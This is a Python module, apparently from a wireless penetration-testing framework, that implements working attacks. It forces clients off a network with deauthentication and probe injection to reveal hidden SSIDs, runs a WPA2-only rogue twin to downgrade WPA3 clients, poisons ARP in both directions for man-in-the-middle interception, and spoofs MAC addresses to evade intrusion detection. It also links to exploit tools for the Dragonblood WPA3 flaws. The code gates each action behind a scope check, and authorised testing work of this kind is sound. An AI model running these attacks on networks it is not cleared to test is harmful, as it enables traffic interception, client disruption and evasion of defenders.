# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""Advanced wireless techniques: hidden-SSID reveal, WPA3 downgrade, client
isolation bypass, and WIDS evasion.

This is the Python port of the last Bash attack module (``lib/attacks/advanced.sh``).
It composes the existing gated primitives rather than reintroducing its own
``subprocess`` sites:

- **Hidden SSID** reveal rides the handshake pattern: a targeted, channel-locked
  airodump capture runs while a finite, single-target deauth (gated aireplay)
  forces clients to reassociate so the AP leaks its ESSID; a wordlist probe
  method (mdk4) is the fallback. The detector/parser are pure.
- **WPA3 classification** is a pure function over an airodump scan row.
- **WPA3 downgrade** stands up a WPA2-only twin of the SSID to pull clients off
  a transition-mode AP, mirroring :class:`~netreaper.wireless.eviltwin.EvilTwin`'s
  publish-before-mutate / ``dirty`` / pidfile-teardown discipline.
- **Client isolation** check is a gated single-target ping; the ARP-spoof bypass
  runs two gated, target-scoped poison streams as background tasks that the one
  process seam kills (SIGTERM then SIGKILL) on teardown, and toggles our own
  ``ip_forward`` through the host-action lane.
- **Evasion** reuses :mod:`netreaper.wireless.mac` to randomise or clone the
  adapter MAC.

Every network-targeted spawn carries ``targets`` + ``tier`` through the scope
gate; every local host mutation (our own interface, sysctl) goes through
:func:`run_host`. A scope denial (:class:`TargetValidationError`) is never
swallowed.
"""
from __future__ import annotations

import asyncio
import contextlib
import re
import shutil
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

from netreaper.automation.handlers._host import run_host
from netreaper.core.constants import NETREAPER_CONFIG_DIR
from netreaper.core.logging import get_logger
from netreaper.core.process import ProcessRunner, get_process_runner
from netreaper.core.validation import require_bssid, require_interface
from netreaper.safety.scope import Tier, get_scope_gate
from netreaper.tools.aireplay import AireplayTool
from netreaper.wireless.eviltwin import channel_hw_mode
from netreaper.wireless.mac import change_mac
from netreaper.wireless.scan import AccessPoint, ScanResult, parse_airodump_csv

logger = get_logger(__name__)

# airodump renders a hidden ESSID either as an empty field or as the live-view
# "<length:  N>" placeholder; treat both (and any all-non-printable value) as hidden.
_HIDDEN_MARKER = re.compile(r"^<length:\s*\d*>?$")

# A throwaway PSK for the WPA2 downgrade twin. Not a secret: it is the AP we
# stand up to pull transition-mode clients onto the weaker cipher.
_DEFAULT_DOWNGRADE_PSK = "12345678"


def _to_colon_mac(mac: str) -> str:
    """Normalise a validated MAC/BSSID (colon, hyphen or bare hex) to colon-upper.

    ``require_bssid`` accepts colon, hyphen and bare-12-hex forms, but
    ``wireless.mac.change_mac`` (and airodump scope entries) expect colon form.
    Canonicalising here keeps a hyphen/bare-hex BSSID from crashing change_mac.
    """
    hexonly = mac.replace(":", "").replace("-", "")
    return ":".join(hexonly[i : i + 2] for i in range(0, 12, 2)).upper()


# ───────────────────────── hidden SSID: pure helpers ─────────────────────────


def is_hidden_ap(ap: AccessPoint) -> bool:
    """True when an access point's ESSID is hidden (cloaked beacon)."""
    essid = ap.essid.strip()
    if not essid:
        return True
    if _HIDDEN_MARKER.match(essid):
        return True
    # All control/non-printable (e.g. a run of NULs airodump kept): hidden.
    return not any(ch.isprintable() and not ch.isspace() for ch in essid)


def find_hidden_aps(scan: ScanResult) -> list[AccessPoint]:
    """Return the access points in a scan whose ESSID is hidden."""
    return [ap for ap in scan.access_points if is_hidden_ap(ap)]


def revealed_essid(scan: ScanResult, bssid: str) -> str | None:
    """Return the now-visible ESSID for ``bssid`` in a scan, or None if still
    hidden / absent."""
    ap = scan.find_ap(bssid)
    if ap is None or is_hidden_ap(ap):
        return None
    return ap.essid.strip()


# ───────────────────────── WPA3 classification (pure) ────────────────────────


def classify_security(ap: AccessPoint) -> str:
    """Classify an AP's security from its airodump privacy/auth fields.

    Returns one of ``wpa3``, ``owe``, ``wpa2``, ``wpa``, ``wep`` or ``open``.
    WPA3 is identified by SAE (auth) or a WPA3 privacy tag; OWE (Enhanced Open)
    by its auth/privacy tag.
    """
    priv = ap.privacy.upper()
    auth = ap.auth.upper()
    if "SAE" in auth or "WPA3" in priv:
        return "wpa3"
    if "OWE" in auth or "OWE" in priv:
        return "owe"
    if "WPA2" in priv:
        return "wpa2"
    if "WPA" in priv:
        return "wpa"
    if "WEP" in priv:
        return "wep"
    return "open"


# ───────────────────────── WPA3 Dragonblood advisory ─────────────────────────


@dataclass
class DragonbloodAdvisory:
    """A passive advisory for the Dragonblood WPA3/SAE weaknesses.

    This is informational only: active exploitation needs specialised tooling
    (listed in :attr:`tools`), which is out of NETREAPER's scope.
    """

    cves: dict[str, str] = field(
        default_factory=lambda: {
            "CVE-2019-9494": "SAE cache-based side-channel (password partitioning)",
            "CVE-2019-9496": "SAE/EAP-pwd denial of service",
        }
    )
    tools: dict[str, str] = field(
        default_factory=lambda: {
            "dragonslayer": "https://github.com/vanhoefm/dragonslayer",
            "dragondrain-and-time": "https://github.com/vanhoefm/dragondrain-and-time",
        }
    )

    def render(self) -> str:
        """Human-readable advisory text."""
        lines = ["Dragonblood (WPA3/SAE) advisory — passive check only:"]
        lines += [f"  {cve}: {desc}" for cve, desc in self.cves.items()]
        lines.append("For active testing use:")
        lines += [f"  {name}: {url}" for name, url in self.tools.items()]
        return "\n".join(lines)


def dragonblood_advisory() -> DragonbloodAdvisory:
    """Return the (passive) Dragonblood advisory."""
    return DragonbloodAdvisory()


# ───────────────────────── hidden SSID: orchestration ────────────────────────


class HiddenSSIDReveal:
    """Reveal a cloaked ESSID for one in-scope BSSID.

    Two methods, both gated: ``reveal_by_deauth`` forces reassociation and reads
    the leaked ESSID from a targeted capture; ``reveal_by_probe`` injects probe
    requests from a wordlist (mdk4) to elicit a directed probe response.
    """

    def __init__(
        self,
        aireplay: AireplayTool | None = None,
        runner: ProcessRunner | None = None,
    ) -> None:
        self._aireplay = aireplay or AireplayTool()
        self._run = runner or get_process_runner()

    async def reveal_by_deauth(
        self,
        interface: str,
        bssid: str,
        channel: int,
        *,
        capture_seconds: int = 12,
        deauth_count: int = 5,
        settle_seconds: int = 2,
    ) -> str | None:
        """Deauth clients of ``bssid`` and read the ESSID they leak on reconnect.

        The capture is a targeted, channel-locked airodump (ACTIVE_SCAN); the
        deauth is finite and single-target (the normal, non-broadcast technique).
        Returns the revealed ESSID, or None if it stayed hidden.
        """
        iface = require_interface(interface)
        target = require_bssid(bssid)
        tmp = Path(tempfile.mkdtemp(prefix="netreaper_hidden_"))
        prefix = tmp / "reveal"
        try:
            cap_task = asyncio.create_task(
                self._capture(iface, target, channel, prefix, capture_seconds)
            )
            try:
                await asyncio.sleep(min(settle_seconds, max(0, capture_seconds - 1)))
                await self._aireplay.deauth_attack(
                    iface, target, count=deauth_count
                )
                await cap_task
            except BaseException:
                cap_task.cancel()
                with contextlib.suppress(asyncio.CancelledError):
                    await cap_task
                raise
            csv_path = Path(f"{prefix}-01.csv")
            if not csv_path.exists():
                logger.warning("no capture CSV at %s; SSID not revealed", csv_path)
                return None
            essid = revealed_essid(
                parse_airodump_csv(csv_path.read_text(errors="replace")), target
            )
            if essid:
                logger.info("Revealed hidden SSID for %s: %s", target, essid)
            else:
                logger.info("SSID for %s stayed hidden", target)
            return essid
        finally:
            # Always remove the capture scratch dir, on success or failure, to
            # match handshake.py's cleanup discipline (M2).
            shutil.rmtree(tmp, ignore_errors=True)

    async def _capture(
        self, iface: str, bssid: str, channel: int, prefix: Path, seconds: int
    ) -> None:
        """Targeted, channel-locked airodump capture (gated ACTIVE_SCAN)."""
        cmd = [
            "airodump-ng", "--bssid", bssid, "-c", str(channel),
            "--output-format", "csv", "--write", str(prefix),
            "--write-interval", "1", iface,
        ]
        from netreaper.core.exceptions import SubprocessError

        with contextlib.suppress(SubprocessError):
            # airodump runs until stopped; the timeout is the capture window.
            await self._run.run(
                cmd, targets=[bssid], tier=Tier.ACTIVE_SCAN, timeout=seconds
            )

    async def reveal_by_probe(
        self,
        interface: str,
        bssid: str,
        wordlist: str | Path,
        *,
        per_ssid_timeout: int = 2,
    ) -> None:
        """Inject directed probe requests for each candidate SSID (mdk4).

        Each mdk4 run targets the in-scope ``bssid`` (single-target). Comment and
        blank lines in the wordlist are skipped. The revealed SSID surfaces in a
        concurrent airodump view; this method drives the probes only.
        """
        iface = require_interface(interface)
        target = require_bssid(bssid)
        wl = Path(wordlist)
        if not wl.is_file():
            raise FileNotFoundError(f"wordlist not found: {wl}")
        from netreaper.core.exceptions import SubprocessError

        for raw in wl.read_text(errors="replace").splitlines():
            ssid = raw.strip()
            if not ssid or ssid.startswith("#"):
                continue
            with tempfile.NamedTemporaryFile(
                "w", prefix="netreaper_probe_", suffix=".lst", delete=True
            ) as fh:
                fh.write(ssid + "\n")
                fh.flush()
                with contextlib.suppress(SubprocessError):
                    await self._run.run(
                        ["mdk4", iface, "p", "-t", target, "-f", fh.name],
                        targets=[target],
                        tier=Tier.SINGLE_TARGET,
                        destructive=True,
                        timeout=per_ssid_timeout,
                    )


# ───────────────────────── WPA3 downgrade (WPA2-only twin) ────────────────────


def wpa2_downgrade_config(
    interface: str, ssid: str, channel: int, passphrase: str = _DEFAULT_DOWNGRADE_PSK
) -> str:
    """Build a WPA2-only hostapd.conf to downgrade a WPA3 transition-mode AP.

    A stronger WPA2-only signal for the same SSID pulls transition-mode clients
    onto the weaker cipher, where a handshake can be captured.
    """
    lines = [
        f"interface={interface}",
        "driver=nl80211",
        f"ssid={ssid}",
        f"hw_mode={channel_hw_mode(channel)}",
        f"channel={channel}",
        "wpa=2",
        "wpa_key_mgmt=WPA-PSK",
        "wpa_pairwise=CCMP",
        "rsn_pairwise=CCMP",
        f"wpa_passphrase={passphrase}",
    ]
    return "\n".join(lines) + "\n"


@dataclass
class DowngradeState:
    interface: str
    ssid: str
    channel: int
    running: bool = False
    hostapd_pidfile: str | None = None
    dirty: bool = False


class WPA3Downgrade:
    """Stand up and tear down a WPA2-only twin to force a transition downgrade."""

    def __init__(self, runner=run_host) -> None:
        self._run = runner
        self.state: DowngradeState | None = None

    async def start(
        self,
        interface: str,
        ssid: str,
        channel: int,
        *,
        passphrase: str = _DEFAULT_DOWNGRADE_PSK,
        config_dir: Path | None = None,
    ) -> DowngradeState:
        """Write the WPA2-only config and start hostapd (daemonised, pidfile)."""
        if self.state is not None and self.state.dirty:
            raise RuntimeError("downgrade AP has unreconciled state; call stop() first")
        iface = require_interface(interface)
        cfg_dir = config_dir or NETREAPER_CONFIG_DIR
        cfg_dir.mkdir(parents=True, exist_ok=True)
        conf_path = cfg_dir / "downgrade-hostapd.conf"
        pidfile = cfg_dir / "downgrade-hostapd.pid"
        conf_path.write_text(wpa2_downgrade_config(iface, ssid, channel, passphrase))

        # Publish state BEFORE mutating the host so a partial failure is still
        # reconcilable by stop().
        state = DowngradeState(iface, ssid, channel, hostapd_pidfile=str(pidfile))
        self.state = state
        state.dirty = True

        await self._run(["ip", "link", "set", iface, "up"], destructive=True)
        await self._run(
            ["hostapd", "-B", "-P", str(pidfile), str(conf_path)], destructive=True
        )
        state.running = True
        logger.info(
            "WPA2 downgrade twin '%s' up on %s channel %d", ssid, iface, channel
        )
        return state

    async def stop(self) -> None:
        """Kill exactly our hostapd (by pidfile) and bring the interface down."""
        state = self.state
        if state is None:
            return
        await self._kill_by_pidfile(state.hostapd_pidfile)
        await self._run(
            ["ip", "link", "set", state.interface, "down"], destructive=True
        )
        state.running = False
        state.dirty = False
        logger.info("WPA2 downgrade twin '%s' torn down", state.ssid)

    async def _kill_by_pidfile(self, pidfile: str | None) -> None:
        if not pidfile:
            return
        path = Path(pidfile)
        if not path.exists():
            return
        try:
            pid = path.read_text().strip()
        except OSError:
            return
        if pid.isdigit():
            await self._run(["kill", pid], destructive=True)


# ───────────────────────── client isolation bypass ───────────────────────────


async def check_isolation(
    target_ip: str, *, runner: ProcessRunner | None = None, timeout: float = 5.0
) -> bool:
    """Probe whether a client is reachable (no AP client isolation).

    A single gated ICMP echo to the in-scope ``target_ip`` (ACTIVE_SCAN). Returns
    True when the target answers (isolation is off), False otherwise.
    """
    run = runner or get_process_runner()
    from netreaper.core.exceptions import SubprocessError, ToolNotFoundError

    try:
        result = await run.run(
            ["ping", "-c", "1", "-W", "2", target_ip],
            targets=[target_ip],
            tier=Tier.ACTIVE_SCAN,
            timeout=timeout,
        )
    except (SubprocessError, ToolNotFoundError):
        return False
    return result.ok


@dataclass
class ArpSpoofState:
    interface: str
    gateway: str
    target: str
    running: bool = False
    dirty: bool = False


class ArpSpoof:
    """Bidirectional ARP-spoof MITM that bypasses client isolation.

    Two poison streams (victim→us-as-gateway and gateway→us-as-victim) run as
    background tasks through the one process seam, so teardown kills their whole
    process group (SIGTERM then SIGKILL). ``ip_forward`` is toggled through the
    host-action lane. Both IPs must be in the engagement scope; the poison runs
    at MITM tier.
    """

    def __init__(self, runner: ProcessRunner | None = None) -> None:
        self._run = runner or get_process_runner()
        self._tasks: list[asyncio.Task] = []
        self.state: ArpSpoofState | None = None

    async def start(self, interface: str, gateway: str, target: str) -> ArpSpoofState:
        """Enable forwarding and launch both poison streams (gated, MITM tier)."""
        if self.state is not None and self.state.dirty:
            raise RuntimeError("ARP spoof has unreconciled state; call stop() first")
        iface = require_interface(interface)

        # Fail closed up front: authorise both hosts at MITM tier BEFORE enabling
        # forwarding or launching the poison streams, so an out-of-scope target is
        # denied cleanly and ip_forward is never left enabled for a denied run.
        # (The per-command gate check inside each poison task still applies.)
        get_scope_gate().authorize(
            [gateway, target], tier=Tier.MITM, destructive=True
        )

        state = ArpSpoofState(iface, gateway, target)
        self.state = state
        state.dirty = True

        # Our own kernel setting: host action, no network target.
        await self._run.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            host_action=True,
            destructive=True,
        )
        # Poison both directions. Each command names the two in-scope hosts, so
        # both are scope-checked; the gate refuses if either is out of scope.
        for victim, spoofed in ((target, gateway), (gateway, target)):
            self._tasks.append(
                asyncio.create_task(self._poison(iface, victim, spoofed))
            )
        state.running = True
        logger.info("ARP spoof running: %s <-> %s on %s", gateway, target, iface)
        return state

    async def _poison(self, iface: str, victim: str, spoofed: str) -> None:
        from netreaper.core.exceptions import SubprocessError, ToolNotFoundError

        try:
            # arpspoof runs until cancelled; cancelling the task tears the
            # process group down via the seam. None timeout = run until stopped.
            await self._run.run(
                ["arpspoof", "-i", iface, "-t", victim, spoofed],
                targets=[victim, spoofed],
                tier=Tier.MITM,
                destructive=True,
                timeout=None,
            )
        except (SubprocessError, ToolNotFoundError):
            pass
        except Exception:
            # Never leave an unretrieved task exception (CancelledError is a
            # BaseException, so cancellation still propagates and reaps the group).
            logger.exception(
                "arpspoof poison stream failed (%s -> %s)", victim, spoofed
            )

    async def stop(self) -> None:
        """Cancel both poison streams and disable forwarding."""
        state = self.state
        if state is None:
            return
        for task in self._tasks:
            task.cancel()
        for task in self._tasks:
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await task
        self._tasks.clear()
        await self._run.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            host_action=True,
            destructive=True,
        )
        state.running = False
        state.dirty = False
        logger.info("ARP spoof torn down: %s <-> %s", state.gateway, state.target)


# ───────────────────────── WIDS evasion (MAC) ────────────────────────────────


async def randomize_mac(interface: str, *, vendor: str = "random") -> str:
    """Randomise the adapter MAC to evade WIDS fingerprinting."""
    iface = require_interface(interface)
    new_mac = await change_mac(iface, vendor=vendor)
    logger.info("Randomised MAC on %s -> %s", iface, new_mac)
    return new_mac


async def clone_ap_mac(
    interface: str, target_bssid: str, channel: int, *, runner=run_host
) -> str:
    """Clone a legitimate AP's BSSID onto our adapter and match its channel."""
    iface = require_interface(interface)
    # require_bssid accepts colon/hyphen/bare-hex; change_mac wants colon form (M1).
    bssid = _to_colon_mac(require_bssid(target_bssid))
    new_mac = await change_mac(iface, new_mac=bssid)
    # Matching the channel is a local op on our own interface: host action.
    result = await runner(["iw", "dev", iface, "set", "channel", str(channel)])
    if result is None or not getattr(result, "ok", False):
        logger.warning("channel set to %d on %s may have failed", channel, iface)
    logger.info("Cloned %s onto %s (channel %d)", bssid, iface, channel)
    return new_mac


__all__ = [
    "ArpSpoof",
    "DragonbloodAdvisory",
    "HiddenSSIDReveal",
    "WPA3Downgrade",
    "check_isolation",
    "classify_security",
    "clone_ap_mac",
    "dragonblood_advisory",
    "find_hidden_aps",
    "is_hidden_ap",
    "randomize_mac",
    "revealed_essid",
    "wpa2_downgrade_config",
]
